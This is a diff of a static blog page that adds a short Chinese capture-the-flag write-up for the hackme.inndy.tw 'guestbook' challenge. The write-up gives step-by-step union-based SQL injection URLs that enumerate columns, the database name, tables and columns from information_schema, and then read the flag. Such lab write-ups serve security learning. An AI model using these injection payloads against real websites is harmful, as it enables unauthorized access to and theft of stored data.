@@ -6,12 +6,16 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://sunzhengyu99.github.io">
-  <title>Archives: 2020 | 一路走到黑</title>
+  <title>Guestbook | 一路走到黑</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="一路走到黑">
-<meta property="og:url" content="https://sunzhengyu99.github.io/archives/2020/index.html">
+  <meta name="description" content="guestbook题目提示：This guestbook sucks. sqlmap is your friend. 是sql注入点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息 在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点union 注入!查看列 12https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;gb&amp;#x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Guestbook">
+<meta property="og:url" content="https://sunzhengyu99.github.io/2020/03/19/Guestbook/index.html">
 <meta property="og:site_name" content="一路走到黑">
+<meta property="og:description" content="guestbook题目提示：This guestbook sucks. sqlmap is your friend. 是sql注入点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息 在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点union 注入!查看列 12https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;gb&amp;#x">
+<meta property="article:published_time" content="2020-03-19T10:25:56.544Z">
+<meta property="article:modified_time" content="2020-03-19T10:29:32.625Z">
 <meta property="article:author" content="sunzy">
 <meta name="twitter:card" content="summary">
   
@@ -149,103 +153,173 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-Guestbook" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      Guestbook
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/19/Guestbook/" class="archive-article-date">
+
+        
+        <a href="/2020/03/19/Guestbook/" class="archive-article-date">
   	<time datetime="2020-03-19T10:25:56.544Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-19</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/19/Guestbook/">Guestbook</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb/?mod=new" target="_blank" rel="noopener">guestbook</a></h1><p>题目提示：<strong>This guestbook sucks. sqlmap is your friend.</strong> 是sql注入<br>点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息</p>
+<p>在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点<br>union 注入!<br>查看列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;gb&#x2F;?mod&#x3D;read&amp;id&#x3D;-1%20union%20select%201,2,3,4%20#</span><br><span class="line">&#x2F;&#x2F;id&#x3D;-1 是让前面的内容不显示</span><br></pre></td></tr></table></figure>
+<p>3被回显</p>
+<p>1.查看数据库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;gb&#x2F;?mod&#x3D;read&amp;id&#x3D;-1%20union%20select%201,2,database(),4%20#</span><br></pre></td></tr></table></figure>
 
-        <div class="article-info info-on-right">
-          
-          
+<p>数据库的名字<code>g8</code></p>
+<p>2.查看表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;gb&#x2F;?mod&#x3D;read&amp;id&#x3D;-1 union select 1,2,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),4#</span><br></pre></td></tr></table></figure>
+<p>发现有一个表 <code>flag</code></p>
+<p>3.测试表的字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;gb&#x2F;?mod&#x3D;read&amp;id&#x3D;-1 union select 1,2,(select column_name from information_schema.columns where table_name&#x3D;&#39;flag&#39; limit 1,1),4#</span><br></pre></td></tr></table></figure>
+<p>仍然显示<code>flag</code></p>
+<p>4.读取flag   </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;gb&#x2F;?mod&#x3D;read&amp;id&#x3D;-1 union select 1,2,(select flag from flag limit 1,1),4#</span><br></pre></td></tr></table></figure>
 
+<p>得到flag!<br><a href="https://i.imgur.com/Jc9imGo.png" target="_blank" rel="noopener"></a></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://sunzhengyu99.github.io/2020/03/19/Guestbook/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/19/myblog/" class="archive-article-date">
-  	<time datetime="2020-03-19T06:48:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-19</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2020/03/19/myblog/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">myblog</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/19/myblog/">myblog</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%EF%BC%81%EF%BC%81/" class="archive-article-date">
-  	<time datetime="2020-03-18T13:46:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-18</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%EF%BC%81%EF%BC%81/">我的第一篇博客！！</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
 
 
           </div>
@@ -268,8 +342,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
